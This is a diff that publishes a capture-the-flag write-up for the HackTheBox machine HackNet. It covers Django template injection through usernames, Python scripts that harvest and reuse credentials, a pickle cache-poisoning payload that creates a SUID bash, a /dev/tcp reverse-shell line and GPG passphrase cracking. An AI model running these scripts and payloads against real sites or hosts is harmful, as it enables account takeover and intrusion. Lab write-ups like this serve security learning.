@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>HackNet - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/HackNet.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for HackNet machine from HackTheBox - Medium difficulty level">
+    <meta name="description" content="Detailed writeup for HackNet machine from HackTheBox - Medium difficulty level">
     <meta name="keywords" content="HackTheBox, HackNet, Medium, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,375 @@
         <h1 class="writeup-title">HackNet</h1>
         <div class="writeup-metadata">
             <span class="difficulty medium">Medium</span>
-            <span class="date">Active machine</span>
+            <span class="date">January 17, 2026</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="HackNet" src="../images/HackNet/pwned.png" /></p>
-<p>HackNet is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once HackNet retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+                <p><img alt="pwned" src="../images/HackNet/pwned.png" /></p>
+<p>Hacknet was a medium-difficulty Linux machine that began with discovering a Django-based "social network for hackers" on port 80.
+After creating an account and identifying the framework through 404 error page fingerprinting, I discovered a Server-Side Template Injection (SSTI) vulnerability in the /likes endpoint where usernames were rendered directly into templates without sanitization.
+Setting my username to <code>{{7*7}}</code> confirmed the vulnerability when the functionality broke.</p>
+<p>I exploited the SSTI by setting my username to {{users.values}} to dump the entire user queryset, revealing email addresses and passwords.
+Since complex loops caused 500 errors, I used Burp Intruder to like all 26 forum posts, then created a Python scraper that extracted credentials from each /likes/X endpoint using regex to parse the response bodies, discovering 26 unique user accounts.
+A second scraping script logged in as each user to enumerate their contact lists, revealing a previously hidden user backdoor_bandit who was only visible as a contact of the private user deepdive.
+After friending deepdive and logging in as them to view private posts, I exploited the SSTI again through their liked posts to extract backdoor_bandit's credentials (mikey@hacknet.htb:mYd4rks1dEisH3re), which provided SSH access to the box as user Mikey.</p>
+<p>With no sudo privileges as Mikey, I discovered the writable /var/tmp/django_cache directory owned by Sandy.
+Research into Django's caching mechanism revealed it uses pickle for serialization/deserialization, creating a pickle deserialization vulnerability.
+I crafted a malicious pickle payload using <strong>reduce</strong> to execute os.system() commands, creating poisoned cache files that would be loaded when Sandy accessed the website.
+The payload created a SUID bash binary (/tmp/sandybash) owned by Sandy, granting me access to Sandy's account.</p>
+<p>As Sandy, I found GPG-encrypted SQL backup files in the web directory. After obtaining Sandy's ASCII-armored GPG private key from ~/.gnupg/, I used gpg2john to extract a hash and cracked the passphrase (sweetheart) with John the Ripper.
+Decrypting the three SQL backup files and grepping for passwords revealed root's credentials (root:h4ck3rs4re3veRywh3re99), allowing direct privilege escalation to root.</p>
+<h1>User Flag</h1>
+<p><img alt="nmap" src="../images/HackNet/nmap.png" /></p>
+<p>Initial nmap scan reveals just 2 ports. SSH on 22 and a website on 80.</p>
+<h1>Investigating the website</h1>
+<p><img alt="website" src="../images/HackNet/website.png" /></p>
+<p>It's a "social network for hackers". I'll create an account <code>test:test</code></p>
+<p><img alt="profile" src="../images/HackNet/profile.png" /></p>
+<p>Before looking for things like XSS and other web vulnerabilities, I will check what framework is being used here with BurpSuite.</p>
+<p><img alt="req" src="../images/HackNet/req.png" /></p>
+<p>I do not recognize this cookie format. Another good way to pinpoint the framework is by looking at the 404 error pages. Default, unchanged pages will often give out the underlying framework.</p>
+<p><img alt="404" src="../images/HackNet/404.png" /></p>
+<p><a href="https://0xdf.gitlab.io/cheatsheets/404">https://0xdf.gitlab.io/cheatsheets/404</a></p>
+<p>Using this resource from 0xdf, I can see that my error page perfectly matches the default 404 page in Django.</p>
+<p><img alt="page" src="../images/HackNet/page.png" /></p>
+<p>Having confirmed the framework, I tested for XSS and HTML parsing, with no positive effect.</p>
+<p><img alt="noxss" src="../images/HackNet/noxss.png" /></p>
+<h2>SSTI In the /likes endpoint</h2>
+<p>Another attack I could try right now is Server-Side Template Injection. This occurs when user-controller data is passed directly into a template. Templates are often used with dynamically displayed content, for example, usernames on a forum.</p>
+<p>I will set my username to a simple <code>{{7*7}}</code> template, which will allow me to notice where things may have been broken due to SSTI. If I see a <code>49</code> somewhere, or a functionality breaks for no apparent reason, it'll most likely be due to this SSTI payload.</p>
+<p><img alt="normal" src="../images/HackNet/normal.png" /></p>
+<p>I began clicking around the forum section, and when I wanted to list the likes after I liked a comment...</p>
+<p><img alt="wrong" src="../images/HackNet/wrong.png" /></p>
+<p>There it is! The confirmation that SSTI is possible on this website. I'll have a look at what happens when I click the like list under an unaffected comment.</p>
+<p><img alt="req1" src="../images/HackNet/req1.png" /></p>
+<p>A request is being made to <code>/likes/X</code>, with X being the post number.</p>
+<p><img alt="response" src="../images/HackNet/response.png" /></p>
+<p>The response to that contains a bunch of divs linking back to user profiles and their profile pictures, but the most interesting things here are the titles. This is what is displayed when a user hovers their mouse over the profile picture on the list.</p>
+<p>These title values are actual user names, placed directly into a template and rendered on the forum. This explains why it crashed when I liked a comment, as my username <code>{{7*7}}</code> was passed directly into the template, and was treated as an operation instead of an username.</p>
+<h2>Grabbing data of all users</h2>
+<p>To actually make use of this, I will look through the <code>user</code> queryset values. A queryset is just a collection of data from a database. To do this, I will change my username to <code>{{users.values}}</code></p>
+<p><img alt="useres" src="../images/HackNet/users.png" /></p>
+<p>The response contains every bit of data stored about the users. However, this is very messy and bloated. I just need the emails and the password, as that is what's needed to login into the forum.</p>
+<p>I wanted to do this cleanly with a loop over all users, but trying to set such usernames caused the server to return a 500 internal server error message. The same issue occurred when trying to grab a list of the two values from the queryset</p>
+<p><code>{% for user in users.values %} {{user.email}} - {{user.password}} {% endfor $}</code></p>
+<p><code>{{users.values_list('email', 'password')}}</code></p>
+<p>Instead of all that, I will utilize BurpSuite's Intruder this time. The goal of this is to like every single post on the forum.</p>
+<p><img alt="intruder" src="../images/HackNet/intruder.png" /></p>
+<p>After running the attack, I can confirm that every relevant post has been liked.</p>
+<p><img alt="liked" src="../images/HackNet/liked.png" /></p>
+<p>Why did I do this? Because different users will like different posts. Doing this allows me to grab the most users possible, and it will be a huge part of my next step.</p>
+<h3>Extracting data from the responses</h3>
+<p>I'll repeat the intruder attack, this time looping over the <code>/likes</code> endpoint where the SSTI is happening. I wanted to do this with Intruder as well, but it only grabbed the first matching value in each request.</p>
+<p>Ultimately, I will create a script that sends a request to each <code>/likes/X</code> endpoint, captures the response, and grabs the emails and passwords from the body. This will repeat for every request, saving unique credentials to a file.</p>
+<pre class="codehilite"><code># scraper.py
+
+import requests
+import re
+from html import unescape
+
+BASE_URL = &quot;http://hacknet.htb&quot;
+COOKIES = {
+    'csrftoken': 'G7apPEnyWrk6PCR2DV7TQnO1FSXPRgD1',
+    'sessionid': 'ynmjcc1bj73rivoa1w8x4irhox5de41v'
+}
+
+HEADERS = {
+    'X-Requested-With': 'XMLHttpRequest',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Accept': '*/*',
+    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
+    'Referer': 'http://hacknet.htb/explore',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Connection': 'keep-alive'
+}
+
+credentials = set()
+
+def extract_credentials(text):
+
+    decoded = unescape(text)
+
+    email_pattern = r&quot;'email':\s*'([^']+)'&quot;
+    password_pattern = r&quot;'password':\s*'([^']+)'&quot;
+
+    emails = re.findall(email_pattern, decoded)
+    passwords = re.findall(password_pattern, decoded)
+
+    return list(zip(emails, passwords))
+
+def scrape_likes(start=1, end=26):
+
+    for i in range(start, end + 1):
+        url = f&quot;{BASE_URL}/likes/{i}&quot;
+
+        try:
+            print(f&quot;[*] Scraping {url}&quot;)
+            response = requests.get(url, cookies=COOKIES, headers=HEADERS, timeout=10)
+
+            if response.status_code == 200:
+                cred_pairs = extract_credentials(response.text)
+
+                if cred_pairs:
+                    for email, password in cred_pairs:
+                        cred_pair = (email, password)
+                        if cred_pair not in credentials:
+                            credentials.add(cred_pair)
+                            print(f&quot;[+] Found: {email} : {password}&quot;)
+                        else:
+                            print(f&quot;[~] Duplicate: {email}&quot;)
+                else:
+                    print(f&quot;[-] No credentials found in /likes/{i}&quot;)
+            else:
+                print(f&quot;[-] HTTP {response.status_code} for /likes/{i}&quot;)
+
+        except Exception as e:
+            print(f&quot;[!] Error on /likes/{i}: {e}&quot;)
+
+    return credentials
+
+def save_credentials(filename=&quot;credentials.txt&quot;):
+    with open(filename, 'w') as f:
+        for email, password in sorted(credentials):
+            f.write(f&quot;{email}:{password}\n&quot;)
+    print(f&quot;\n[+] Saved {len(credentials)} unique credentials to {filename}&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    print(&quot;[*] Starting credential extraction...\n&quot;)
+
+    scrape_likes(1, 26)
+
+    print(f&quot;\n[*] Total unique credentials found: {len(credentials)}&quot;)
+    print(&quot;\n--- CREDENTIALS ---&quot;)
+    for email, password in sorted(credentials):
+        print(f&quot;{email}:{password}&quot;)
+
+    save_credentials(
+</code></pre>
+
+<p>It uses <code>set</code> to store unique credentials, and regex findall with proper regular expressions to capture all credentials from the endpoints. This will loop over all 26 posts, and it'll display a nice table of captured credentials at the end.</p>
+<p><img alt="scraper" src="../images/HackNet/scraper.png" /></p>
+<p>26 unique credentials found, excluding my test account. At this point, I can already see the credentials necessary to SSH into the box. However, during my initial solve, I either did not see them or they just were not there. I'll follow my initial solve, and I will ignore these for now.</p>
+<h2>Scraping the contact lists of users</h2>
+<p>The website allows users to set their accounts to either public or not public. This could mean that, for example, their posts would only be visible to their contacts. At the same time, there could be users who have never made/liked a single public post, and as such, my scraper script did not catch them.</p>
+<p>To check whether this is true, I will use my <code>credentials.txt</code> file to log in as every gathered user, check their contact list, and display the results.</p>
+<p>First, I need two things. I need something that is always on the page if there are no contacts, and I need to see how users in the contact list are displayed. The first one will be easy, since my profile has no contacts currently.</p>
+<p><img alt="nocontacts" src="../images/HackNet/nocontacts.png" /></p>
+<p>Perfect. If the user has no contacts, the <code>contacts</code> div will hold the <code>You don't have contacts</code> message. I can look for this to determine whether a user's contact list is empty.</p>
+<p><img alt="contacts" src="../images/HackNet/contacts.png" /></p>
+<p>If the user has at least one contact, a new div with the ID of <code>user-list</code> will contain more divs for each user. I can look for the <code>/profile/X</code> text within the single-user div, or just extract the whole info-block div if I wanted to.</p>
+<pre class="codehilite"><code># scrape_contacts.py
+
+import requests
+import re
+from html import unescape
+from time import sleep
+
+BASE_URL = &quot;http://hacknet.htb&quot;
+
+HEADERS = {
+    'Cache-Control': 'max-age=0',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Origin': 'http://hacknet.htb',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'Referer': 'http://hacknet.htb/login',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Connection': 'keep-alive'
+}
+
+def get_csrf_token(session):
+    response = session.get(f&quot;{BASE_URL}/login&quot;)
+    match = re.search(r'name=&quot;csrfmiddlewaretoken&quot;\s+value=&quot;([^&quot;]+)&quot;', response.text)
+    if match:
+        return match.group(1)
+    return session.cookies.get('csrftoken', '')
+
+def login(email, password):
+    session = requests.Session()
+
+    csrf_token = get_csrf_token(session)
+
+    # Login request
+    login_data = {
+        'csrfmiddlewaretoken': csrf_token,
+        'email': email,
+        'password': password
+    }
+
+    response = session.post(
+        f&quot;{BASE_URL}/login&quot;,
+        data=login_data,
+        headers=HEADERS,
+        allow_redirects=True
+    )
+
+    if response.status_code == 200:
+        return session
+    return None
+
+def get_contacts(session, email):
+    response = session.get(f&quot;{BASE_URL}/contacts&quot;)
+
+    if &quot;You don't have contacts&quot; in response.text or &quot;You don&amp;#x27;t have contacts&quot; in response.text:
+        print(f&quot;    [-] {email} has no contacts&quot;)
+        return []
+
+    # Extract contact usernames
+    contacts = re.findall(r'&lt;a href=&quot;/profile/\d+&quot;&gt;([^&lt;]+)&lt;/a&gt;', response.text)
+
+    if contacts:
+        print(f&quot;    [+] {email} has {len(contacts)} contact(s): {', '.join(contacts)}&quot;)
+        return contacts
+    else:
+        print(f&quot;    [-] {email} has no contacts&quot;)
+        return []
+
+def load_credentials(filename=&quot;credentials.txt&quot;):
+    creds = []
+    try:
+        with open(filename, 'r') as f:
+            for line in f:
+                line = line.strip()
+                if ':' in line:
+                    email, password = line.split(':', 1)
+                    creds.append((email, password))
+    except FileNotFoundError:
+        print(f&quot;[!] {filename} not found!&quot;)
+    return creds
+
+def main():
+    print(&quot;[*] Loading credentials...\n&quot;)
+    credentials = load_credentials(&quot;credentials.txt&quot;)
+
+    if not credentials:
+        print(&quot;[!] No credentials found. Run the scraper first!&quot;)
+        return
+
+    print(f&quot;[*] Found {len(credentials)} credential pairs\n&quot;)
+    print(&quot;[*] Starting login attempts...\n&quot;)
+
+    results = []
+
+    for email, password in credentials:
+        print(f&quot;[*] Trying: {email}:{password}&quot;)
+
+        session = login(email, password)
+
+        if session:
+            print(f&quot;    [+] Login successful!&quot;)
+            contacts = get_contacts(session, email)
+            results.append({
+                'email': email,
+                'password': password,
+                'contacts': contacts
+            })
+        else:
+            print(f&quot;    [X] Login failed&quot;)
+
+        sleep(0.5)
+        print()
+
+    print(&quot;\n&quot; + &quot;-&quot;*60)
+    print(&quot;SUMMARY&quot;)
+    print(&quot;-&quot;*60)
+
+    for result in results:
+        if result['contacts']:
+            print(f&quot;\n{result['email']}:{result['password']}&quot;)
+            print(f&quot;  Contacts: {', '.join(result['contacts'])}&quot;)
+
+    with open(&quot;accounts_with_contacts.txt&quot;, 'w') as f:
+        for result in results:
+            if result['contacts']:
+                f.write(f&quot;{result['email']}:{result['password']}\n&quot;)
+                f.write(f&quot;  Contacts: {', '.join(result['contacts'])}\n\n&quot;)
+
+    print(f&quot;\n[+] Results saved to accounts_with_contacts.txt&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+
+<p><img alt="contactsscrape" src="../images/HackNet/contactsscrape.png" /></p>
+<p>I have not seen this <code>backdoor_bandit</code> user before at all. <code>Deepdive</code> just became much more important as a target.</p>
+<h2>Infiltrating the private users' posts</h2>
+<p><img alt="private" src="../images/HackNet/private.png" /></p>
+<p>As expected, user deepdive has his account set to private. The same can be said about backdoor_bandit. However, I have the former's credentials, which means I can request contact from them and then log in as them to confirm that request.</p>
+<p><img alt="request" src="../images/HackNet/request.png" /></p>
+<p>Why was this needed? In order to see deepdive's private posts, I needed to become a contact of his. Now that this is done, I can read and like their posts, which in turn allows me to exploit the SSTI again.</p>
+<p><img alt="likedpriv" src="../images/HackNet/likedpriv.png" /></p>
+<p>The other person liking their post is <code>backdoor_bandit</code>. I'll get their data with BurpSuite.</p>
+<p><img alt="password" src="../images/HackNet/password.png" /></p>
+<p><code>mikey@hacknet.htb | mYd4rks1dEisH3re</code></p>
+<p>Notice how this one email holds the box name as the domain part of the email. I will try to SSH into the box as Mikey with these creds.</p>
+<p><img alt="user" src="../images/HackNet/user.png" /></p>
+<h1>Root flag</h1>
+<p><img alt="sudol" src="../images/HackNet/sudol.png" /></p>
+<p>Mikey cannot run anything as root on the box. I will take a look into the webroot directory of the website I've just exploited.</p>
+<p><img alt="backups" src="../images/HackNet/backups.png" /></p>
+<p>There are some encrypted backup files owned by the user Sandy. Nothing to do with them right now. Most of the files in the HackNet directory are owned by Sandy.</p>
+<h2>Poisoning Django cache files with pickle deserialization</h2>
+<p><code>find / -type d -writable 2&gt;/dev/null</code></p>
+<p><img alt="cache" src="../images/HackNet/cache.png" /></p>
+<p>I scanned for directories writable by mikey, and <code>/var/tmp/django_cache</code> caught my attention.</p>
+<p>The directory is owned by Sandy... And is empty</p>
+<p><img alt="empty" src="../images/HackNet/empty.png" /></p>
+<p>However, when I refreshed the explore page on the website...</p>
+<p><img alt="new" src="../images/HackNet/new.png" /></p>
+<p>2 new cache files appeared in the dir, both owned by Sandy. This means that I cannot do anything with them, but... What if I were to create one in advance?</p>
+<p>Reading through the Django docs, I stumbled upon an interesting discovery.</p>
+<p><a href="https://docs.djangoproject.com/en/6.0/topics/cache/">https://docs.djangoproject.com/en/6.0/topics/cache/</a></p>
+<p><img alt="cachenote" src="../images/HackNet/cachenote.png" /></p>
+<p>The cache data is serialized and deserialized with pickle. With write access to the directory AND knowledge that the files disappear after some time, I will be able to achieve code execution here.</p>
+<pre class="codehilite"><code>import pickle
+import os
+
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ('cp /bin/bash /tmp/sandybash &amp;&amp; chmod 4755 /tmp/sandybash',))
+
+malicious_data = pickle.dumps(Exploit())
+
+with open('90dbab8f3b1e54369abdeb4ba1efc106.djcache', 'wb') as f:
+    f.write(malicious_data)
+
+with open('1f0acfe7480a469402f1852f8313db86.djcache', 'wb') as f:
+    f.write(malicious_data)
+</code></pre>
+
+<p>After waiting for the cache files to disappear, I ran the Python script within the cache directory and refreshed the <code>/explore</code> page on the website.</p>
+<p><img alt="sandy" src="../images/HackNet/sandy.png" /></p>
+<h2>Decrypting SQL backups</h2>
+<p>Having control over Sandy, I can now focus on the encrypted backup files from earlier. Since the encryption was made with GPG, I will look through Sandy's <code>.gnupg</code> directory to search for a key.</p>
+<p><img alt="weird" src="../images/HackNet/weird.png" /></p>
+<p>Using a bash binary to "elevate" myself to Sandy gives... Unusual results in conjunction with GPG. I will quickly swap the pickle command into a reverse shell, which I'll catch with my listener on port 9001.</p>
+<p><code>bash -c "bash -i &gt;&amp; /dev/tcp/IP/9001 0&gt;&amp;1"</code></p>
+<p><img alt="shell" src="../images/HackNet/shell.png" /></p>
+<p>I will take a look at Sandy's gpg keys now. I'm looking for a way to decrypt the SQL backups from earlier.</p>
+<p><img alt="armored" src="../images/HackNet/armored.png" /></p>
+<p>An ascii-armored key is stored in a base64 format. This makes it easy to copy over to my machine.</p>
+<p><img alt="key" src="../images/HackNet/key.png" /></p>
+<p>The key is protected with a passphrase. I'll use <code>gpg2john</code> to get a crackable hash for it.</p>
+<p><img alt="crack" src="../images/HackNet/crack.png" /></p>
+<p><code>GPG key | sweetheart</code></p>
+<p>I will import the key now in order to use it.</p>
+<p><img alt="import" src="../images/HackNet/import.png" /></p>
+<p>Since I won't need the Sandy shell anymore after this, I will set up a Python server, and I will curl all 3 of the backup files back to my host.</p>
+<p><img alt="curl" src="../images/HackNet/curl.png" /></p>
+<p>I can decrypt these files now, but I still need to provide the passphrase.</p>
+<p><img alt="backupsdec" src="../images/HackNet/backupsdec.png" /></p>
+<p>I'll look through the decrypted backups for a few strings, starting with <code>password</code></p>
+<p><code>cat backup0*.sql | grep password</code></p>
+<p><img alt="passwordroot" src="../images/HackNet/passwordroot.png" /></p>
+<p>I see a brand new password, apparently for MySQL root. I will try it against the box root, though, just in case.</p>
+<p><code>root? | h4ck3rs4re3veRywh3re99</code></p>
+<p><img alt="root" src="../images/HackNet/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
@@ -87,7 +446,7 @@
     
     <footer>
         <div class="container">
-            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
+            <p>&copy; 2026 Hexicon Archives | Created by Hexicon</p>
         </div>
     </footer>
 
